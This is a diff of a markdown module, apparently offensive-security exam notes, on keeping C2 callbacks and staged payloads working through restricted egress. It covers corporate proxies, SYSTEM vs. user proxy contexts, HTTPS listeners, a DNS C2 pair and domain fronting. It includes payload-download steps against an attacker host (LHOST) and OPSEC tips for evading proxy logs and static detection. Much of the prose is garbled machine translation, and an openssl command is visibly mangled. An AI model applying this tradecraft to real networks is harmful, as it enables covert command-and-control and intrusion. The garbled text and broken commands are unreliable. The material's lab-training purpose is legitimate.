@@ -9,17 +9,17 @@ User vs SYSTEM proxy. Every stage of a staged payload uses the same proven path.
 > Covers scenarios: 17, 28, 29, 30, 31, 32, 33
 > Prerequisites: attacker box (Kali) + an entry session; HTTPS needs a self-signed certificate (see [00-environment-and-infra](/modules/00-environment-and-infra) §3); DNS channel needs a domain whose NS points at you, or lab-allowed direct UDP/53; domain fronting needs a CDN/nginx front-end that can forward by custom Host.
 
-**Core idea**: This module solves "code runs but the session / stage 2 never comes back." Every approach hangs off one **proven reachable path** — verify the path first (delivery, proxy, DNS resolution, TLS handshake), then make every stage use that same path. Changing address / port / protocol / proxy context mid-stream is just scenario 30 again.
+**Core idea**: This module solves "code runs but the session / stage 2 never comes back." Every approach hangs off one ** proven reachable path**— verify the path first (delivery, proxy, DNS resolution, TLS handshake), then make every stage use that same path. Changing address / port / protocol / proxy context mid-stream is just scenario 30 again.
 
 ---
 
 ## Scenario 17: Target has no stable egress; download-style stage 2 never arrives
 
-* * Scene review * *: The portal can execute code, but the target cannot access the file server, only releases a few addresses, and all macros/scripts/loaders that rely on temporary downloads fail.
+**Situation**: The portal can execute code, but the target cannot access the file server, only releases a few addresses, and all macros/scripts/loaders that rely on temporary downloads fail.
 
-* * Premises and assumptions * *: Executable code portal (VBA/HTA/JScript, see M01-M03); we put the second stage on the extranet file server; DNS resolution on the target side or arbitrary outbound to the server failed; shellcode and runner are ready.
+**Assumptions**: Executable code portal (VBA/HTA/JScript, see M01-M03); we put the second stage on the extranet file server; DNS resolution on the target side or arbitrary outbound to the server failed; shellcode and runner are ready.
 
-* * Preparation (attack machine side) * *: Make each portal payload into * * two sets of coexistence * *: embedded version (shellcode + runner is completed in a single file/single process, 0 external downloads) and downloaded version (stager takes the second stage → from the attack machine). Don't leave just one, it is very time-consuming to switch shapes and redo in the exam.
+**Prepare (attacker)**: Make each portal payload into **two sets of coexistence**: embedded version (shellcode + runner is completed in a single file/single process, 0 external downloads) and downloaded version (stager takes the second stage → from the attack machine). Don't leave just one, it is very time-consuming to switch shapes and redo in the exam.
 
 ```bash
 # Inline edition preparation: Generate shellcode (confirm the target number first, store x86/x64 separately)
@@ -31,7 +31,7 @@ python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads # Request Log Con
 ```
 
 **Procedure**:
-1. First use harmless callback to confirm the entry execution (callback ping/nslookup/write a file, see M01), * * don't * * run the download version directly - if the callback can't go out, the download will fail.
+1. First use harmless callback to confirm the entry execution (callback ping/nslookup/write a file, see M01), **don't** run the download version directly - if the callback can't go out, the download will fail.
 2. Confirm the target outbound capability: Record which pathway passes from the target side `Test-NetConnection LHOST -Port 80/443`, `nslookup URL`.
 3. Can → use the downloaded version of the stager (document `docs/01` scene 3, `docs/03` scene 9 download execution mode); can not → change the embedded version, embed the second stage directly into the runner single file delivery.
 4. The embedded version is still too large/killed (Scenario 18–19).→ Use the "bridge + C # second stage" of M03 to move the heavyweight logic to the memory JScript/C #, and still do not download it.
@@ -482,23 +482,23 @@ try {
 }
 ````
 
-* * Verification * *: get → download link pass of the target IP appears in the m00 log; the session → full link pass appears on the listening end; when there is no log/session, check whether the portal is not executed or blocked from the network by comparing the "callback three-piece set".
+**Verify**: get → download link pass of the target IP appears in the m00 log; the session → full link pass appears on the listening end; when there is no log/session, check whether the portal is not executed or blocked from the network by comparing the "callback three-piece set".
 
 **If it fails / alternatives**:
 - The target is completely out of the network (including DNS out of the network is not possible),→ abandon the reconnection type scheme, and change to "offline landing type": landing + planned task/service is resident, and the result writing file is retrieved from another entrance (M01 Scenario 5).
 - Only a few domains/ports are allowed to → walk the proxy (Scene 28) or domain prefix (Scene 33) or HTTPS 443 (Scene 31).
 - The embedded version is executed but the number of seconds → does not match or the schema error occurs when the shellcode is generated, using the archbranch version (M01).
 
-* * Exam Note OPSEC * *: Both embedded and downloaded versions are saved and annotated in * * different directories * * to avoid wasting 10 minutes throwing the wrong file; embedded shellcode has static features by default, and is encoded/encrypted according to M05 when needed; "can execute code ≠ can get out of the net", verify the path first and then run payload.
+**Exam notes / OPSEC**: Both embedded and downloaded versions are saved and annotated in ** different directories**to avoid wasting 10 minutes throwing the wrong file; embedded shellcode has static features by default, and is encoded/encrypted according to M05 when needed; "can execute code ≠ can get out of the net", verify the path first and then run payload.
 
 ---
 
 
-* * Scenario review * *: The target is only allowed to access the extranet through the corporate proxy, the browser is normal, direct TCP or ignore the proxy HTTP client failed.
+**Situation**: The target is only allowed to access the extranet through the corporate proxy, the browser is normal, direct TCP or ignore the proxy HTTP client failed.
 
-* * Premises and Assumptions * *: There is a normal user session and can execute PowerShell; the target is configured with a system/user agent (HKCU Internet Settings or browser built-in proxy); the proxy may require NTLM authentication (domain user context is usually transparent).
+**Assumptions**: There is a normal user session and can execute PowerShell; the target is configured with a system/user agent (HKCU Internet Settings or browser built-in proxy); the proxy may require NTLM authentication (domain user context is usually transparent).
 
-* * Preparation (attacker side) * *: Start the drop server/HTTPS snooping (m00 or m09-https-listener.sh); read the proxy configuration from the target side first to confirm whether the proxy can reach your address.
+**Prepare (attacker)**: Start the drop server/HTTPS snooping (m00 or m09-https-listener.sh); read the proxy configuration from the target side first to confirm whether the proxy can reach your address.
 
 ```powershell
 # Target side: Read user agent settings (WinINet)
@@ -518,24 +518,24 @@ reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v 
 | `m09-proxy-aware-downloader.ps1` | System Proxy/Explicit Proxy Download with Authentication | `-Url http://lhost/payload -OutFile' or `-Command` |
 | `m00-delivery-server.py` | Deliver + Confirm Target Request | `--port 80 --dir ~/osep/payloads` |
 
-* * Validation * *: get from proxy/target appears in the m00 log; there is a callback output after execution of the script downloaded in `-Command` mode; the contents of the test file are consistent with the source.
+**Verify**: get from proxy/target appears in the m00 log; there is a callback output after execution of the script downloaded in `-Command` mode; the contents of the test file are consistent with the source.
 
 **If it fails / alternatives**:
 - The browser uses a built-in proxy (Firefox is configured separately) and the system proxy is empty. Read the proxy address → from the browser settings and use the explicit `-ProxyUrl http://proxy: port` instead.
 - The proxy wants to authenticate and the current token does not → use the known credentials` -ProxyUser/-ProxyPass`; only the plaintext HTTP proxy will expose the credentials to the proxy, try to make the traffic HTTPS.
 - The proxy only releases whitelisted domains → domain prefix (Scenario 33) or DNS (Scenario 32).
 
-* * Exam Note OPSEC * *: The proxy log can see that the destination URL → download stage uses the non-featured file name, and the reconnection stage goes back to HTTPS. Keep the UA consistent in the same session (the m09 script defaults to browser UA). Do not leave the clear text of the domain credentials in the command line history, and use `-DefaultCreds` if necessary.
+**Exam notes / OPSEC**: The proxy log can see that the destination URL → download stage uses the non-featured file name, and the reconnection stage goes back to HTTPS. Keep the UA consistent in the same session (the m09 script defaults to browser UA). Do not leave the clear text of the domain credentials in the command line history, and use `-DefaultCreds` if necessary.
 
 ---
 
 ## Scenario 29: User-context session callbacks; after SYSTEM elevation the channel dies
 
-* * Scenario review * *: The same machine, the same address, the communication in advance is normal, and the system identity fails - the proxy settings and authentication contexts for the two identities are different.
+**Situation**: The same machine, the same address, the communication in advance is normal, and the system identity fails - the proxy settings and authentication contexts for the two identities are different.
 
-* * Prerequisites and assumptions * *: The system (service, scheduled task, token replication, etc.) has been raised from the user session; the enterprise outbound network must be proxied; the user profile proxy is configured in HKCU (WinINet), and the system defaults to WinHTTP (`netsh winhttp`). The two * * do not share * *, and the system does not have the user's credential context.
+**Assumptions**: The system (service, scheduled task, token replication, etc.) has been raised from the user session; the enterprise outbound network must be proxied; the user profile proxy is configured in HKCU (WinINet), and the system defaults to WinHTTP (`netsh winhttp`). The two ** do not share**, and the system does not have the user's credential context.
 
-* * Preparation (attack machine side) * *: Start listening; compare the outputs of the two proxy chains on the target side first:
+**Prepare (attacker)**: Start listening; compare the outputs of the two proxy chains on the target side first:
 
 ```cmd
 rem target side (user shell)
@@ -561,24 +561,24 @@ netsh winhttp show proxy
 | `m09-proxy-aware-downloader.ps1` | Dual context downloader; explicit proxy under system | `-ProxyUrl http://proxy: 8080 -DefaultCreds` |
 | `m00-delivery-server.py` | Verify that system is really requesting a delivery address | `--port 80` |
 
-* * Verify * *: get appears in the m00 log under the system context; or `netsh winhttp show proxy` shows that the proxy has been set and the reconnection is successful; the difference in the output of the control group (before/after the change) should be explained.
+**Verify**: get appears in the m00 log under the system context; or `netsh winhttp show proxy` shows that the proxy has been set and the reconnection is successful; the difference in the output of the control group (before/after the change) should be explained.
 
 **If it fails / alternatives**:
 - Changing the machine proxy is not allowed (will break the system service out of the network)→ with the M08 tunnel: forwarding at the target reachable location, let the traffic through the user context/springboard.
 - The proxy performs a network segment, or swaps a DNS channel, for a process with credentials derived from a → user context for which system has no credentials available.
 - The invocation portal itself is triggered when the proxy parameters are written → to the payload command line in a non-interactive form such as service restart.
 
-* * Exam note OPSEC * *: `netsh winhttp set proxy` affects * * the whole machine * *, which may affect other services in the test network and even be judged as disruptive - be sure to save the original value and use up the reset; system backlash as much as possible 443/80 regular ports; test and record the two paths "user vs system" once, do not waste time repeatedly testing the parameters of the user mode under system.
+**Exam notes / OPSEC**: `netsh winhttp set proxy` affects **the whole machine**, which may affect other services in the test network and even be judged as disruptive - be sure to save the original value and use up the reset; system backlash as much as possible 443/80 regular ports; test and record the two paths "user vs system" once, do not waste time repeatedly testing the parameters of the user mode under system.
 
 ---
 
 ## Scenario 30: Stage 1 callbacks succeed; stage 2 never appears
 
-* * Scenario review * *: The portal successfully contacts the listening end, but another address/port/protocol is used in the subsequent stage, and that path is not allowed by the target or is not configured at all.
+**Situation**: The portal successfully contacts the listening end, but another address/port/protocol is used in the subsequent stage, and that path is not allowed by the target or is not configured at all.
 
-* * Prerequisites and assumptions * *: stage 1 (stager/callback) is passed; monitoring and delivery infrastructure is planned on the attack machine side according to `docs/00` fixed port (80 deliveries, 443 reconnections, 4444 standby).
+**Assumptions**: stage 1 (stager/callback) is passed; monitoring and delivery infrastructure is planned on the attack machine side according to `docs/00` fixed port (80 deliveries, 443 reconnections, 4444 standby).
 
-* * Preparation (attacker side) * *: Create a "path card" for each session with fixed fields: Portal → Download Address/Protocol/Port → Listen Address/Protocol/Port → Proxy Context → UA. Changing the path of any stage is performed after changing the card.
+**Prepare (attacker)**: Create a "path card" for each session with fixed fields: Portal → Download Address/Protocol/Port → Listen Address/Protocol/Port → Proxy Context → UA. Changing the path of any stage is performed after changing the card.
 
 **Procedure**:
 1. Locate the breakpoint: If the second stage is "download execution", see if the m00/nginx log has a second stage get from the target; no → target did not go to the download address; there is but no session → execution/digit problem (go to M05).
@@ -588,7 +588,7 @@ netsh winhttp show proxy
 - Protocol inconsistency: stage 1 HTTP passes, stage 2 reverse_https is exported to block → all phases with an authenticated protocol (443/HTTPS or proxy path).
 - Agent context: the first stage can be downloaded in the user context, the second stage is triggered by system (see scenario 29).
 - Delivery server not started/directory name incorrect/`payload` file name case or path mismatch.
-3. The most stable practice: * * stageless * * (one connection with all) instead of staged (first connected and then retrieved), to avoid the second stage is inherently dependent on the second path; when it must be staged, two stages go to the same delivery server and the same URL template.
+3. The most stable practice: **stageless** (one connection with all) instead of staged (first connected and then retrieved), to avoid the second stage is inherently dependent on the second path; when it must be staged, two stages go to the same delivery server and the same URL template.
 4. Set `set ExitOnSession false` on the listening end to avoid turning off the entire handler when the first session is broken.
 
 **Lab files**:
@@ -934,10 +934,10 @@ exit 0
 
 **Situation**: the target can access the regular HTTPS website, and our side payload failed at the TLS handshake or request stage - there is proxy check, certificate trust or application layer (UA/path) filter.
 
-** Presumptives and assumptions**: exports will only be released 443/HTTPS; there may be an intermediate TLS (MiTM re-sign) or only a check to a white list domain name; our listening side will be able to provide HTTPS services and view handshakes/request logs.
+**Presumptives and assumptions**: exports will only be released 443/HTTPS; there may be an intermediate TLS (MiTM re-sign) or only a check to a white list domain name; our listening side will be able to provide HTTPS services and view handshakes/request logs.
 
 **Prepare (attacker)**: Generate certificates and start HTTPS delivery/tapping, both of which are ready:
-- Self-signed: `opensl req-newkey rsa: 2048-nodes-keyout key.pem-x509-days 365-out cert.pem-subj "/CN=LHOST' (where the target does not check the root; ** fingerprinting is easy to miscalculate).
+- Self-signed: `opensl req-newkey rsa: 2048-nodes-keyout key.pem-x509-days 365-out cert.pem-subj "/CN=LHOST' (where the target does not check the root;**fingerprinting is easy to miscalculate).
 - Credible certificates: Public domain name + Let's Encrypt (the most stable when exporting without MITM); an in-school CA can also import trust in an experimental network.
 
 **Procedure**:
@@ -1106,7 +1106,7 @@ http {
 - Exports are based on SNI/purpose IP white list domain prefix (33); even white list outer domain names are not analysed DNS channel (32).
 - The client does not verify but the handshake failed
 
-** OPSEC**: Fingerprints of the visa book are visible, miscalculated to confirm that your own fingerprints are in the listening log; UA is consistent with the delivery/download phase, with half of the default disguise; HTTPS not encrypted agent Host/SNI, do not place confidential in URL.
+**OPSEC**: Fingerprints of the visa book are visible, miscalculated to confirm that your own fingerprints are in the listening log; UA is consistent with the delivery/download phase, with half of the default disguise; HTTPS not encrypted agent Host/SNI, do not place confidential in URL.
 
 ---
 
@@ -1114,7 +1114,7 @@ http {
 
 **Situation**: the target can execute the code and no direct connection to the regular agent is available, but the target is still available online through DNS.
 
-** Preconditions and assumptions**: the experimental/test environment explicitly allows the DNS tunnel (textbook §14.7); you have a domain (or a domain name allowed within the experimental network) and can point the NS records to the attacker, or the target can reach the attacker directly UDP 53; the target machine is capable of executing our client (Python 3 needs an interpreter; dnscat2/iodine or PowerShell port, as described in the script note).
+**Preconditions and assumptions**: the experimental/test environment explicitly allows the DNS tunnel (textbook §14.7); you have a domain (or a domain name allowed within the experimental network) and can point the NS records to the attacker, or the target can reach the attacker directly UDP 53; the target machine is capable of executing our client (Python 3 needs an interpreter; dnscat2/iodine or PowerShell port, as described in the script note).
 
 **Prepare (attacker)**: this module carries its smallest DNS C2 pair (`m09-dns-c2-server.py`+ `m09-dns-c2-client.py`) for "Recognizing that the DNS channel can be retrieved by means of + transmission command". The complete tunnel tool dnscat2/iodine goes up when needed. UDP 53:
 
@@ -1619,7 +1619,7 @@ if __name__ == "__main__":
 
 **Situation**: Targets only allow access to specific front-end addresses, with no direct access to back-end; pilot infrastructure supports "front-end separation" (teach material § 14.6).
 
-** Preconditions and assumptions**: one objective** allows access to ** front-end address (FRONT domain/IP); there is a facility that can route requests to the back end by HTTP Post - real CDN (e.g. Azur Front Door) or self-built nginx reverse agent simulation; backend = your C2-delivered server. ** Key to the establishment of the front field**: The export inspection saw TLS SNI/Date Address = FRONT, while HTTP Host Head = Backend Route.
+**Preconditions and assumptions**: one objective ** allows access to **front-end address (FRONT domain/IP); there is a facility that can route requests to the back end by HTTP Post - real CDN (e.g. Azur Front Door) or self-built nginx reverse agent simulation; backend = your C2-delivered server.** Key to the establishment of the front field**: The export inspection saw TLS SNI/Date Address = FRONT, while HTTP Host Head = Backend Route.
 
 **Prepare (attacker)**: Self-Construction Laboratory Frontend nginx (443 + FRONT certificate)+ backend listening:
 
@@ -1659,7 +1659,7 @@ Real CDN version: Register BACKEND as a CDN backend source, the one where the fr
 - CDN does not forward custom Host (many CDNs will 502 reject) → The experimental infrastructure is not supported, is replaced by a self-built front end, or is abandoned.
 - Targets only release FRONT and FRONT is not the domain name that you can control the certificate.
 
-** OPSEC**: scene 33 is ** infrastructure dependencies** (the original scenario is clearly "dependent on specific service support") - – Do not go on the payload for the first time in the test with a harmless GET test before the exam; Domain foreground requires a separation of Host and SNI, and do not spell the mechanism in the report.
+**OPSEC**: scene 33 is ** infrastructure dependencies** (the original scenario is clearly "dependent on specific service support") - – Do not go on the payload for the first time in the test with a harmless GET test before the exam; Domain foreground requires a separation of Host and SNI, and do not spell the mechanism in the report.
 
 ---
 
